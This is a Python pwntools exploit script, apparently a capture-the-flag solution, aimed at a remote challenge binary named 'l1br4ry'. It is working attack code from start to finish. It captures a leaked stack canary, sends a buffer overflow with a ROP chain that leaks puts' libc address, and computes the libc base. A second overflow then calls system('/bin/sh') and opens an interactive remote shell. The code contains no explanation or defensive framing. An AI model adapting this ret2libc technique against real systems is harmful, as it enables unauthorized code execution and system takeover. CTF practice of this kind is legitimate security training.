from pwn import *

if __name__ == "__main__":
    #io = process('./l1br4ry')
    io = remote('gc1.eng.run', 31977)
    libc = ELF('./libc.so.6')
    puts=0x401090
    puts_got = 0x404018
    ret = 0x0000000000401323+1
    pop_rdi = 0x0000000000401323
    main = 0x40122c
    io.recvuntil('Welcome to the l1br4ry, here is a gift for you: ')
    canary = int(io.recvline(),16)
    print(hex(canary))
    io.recvuntil("But do you know about system?\n")

    rop = [
        'A'*0x18,
        canary,
        0,
        pop_rdi,
        puts_got,
        puts,
        main
    ]
    io.send(flat(rop,arch='amd64'))
    leak=io.recvline()
    puts_libc = u64(leak.strip()+b'\0\0')
    libc_base = puts_libc - libc.sym.puts

    libc.address = libc_base
    bin_sh = next(libc.search(b"/bin/sh"))

    io.recvuntil('Welcome to the l1br4ry, here is a gift for you: ')
    canary = int(io.recvline(),16)
    print(hex(canary))
    io.recvuntil("But do you know about system?\n") 

    rop = [
        'A'*0x18,
        canary,
        0,
        pop_rdi,
        bin_sh,
        ret,
        libc.sym.system
    ]
    io.send(flat(rop,arch='amd64'))
    io.interactive()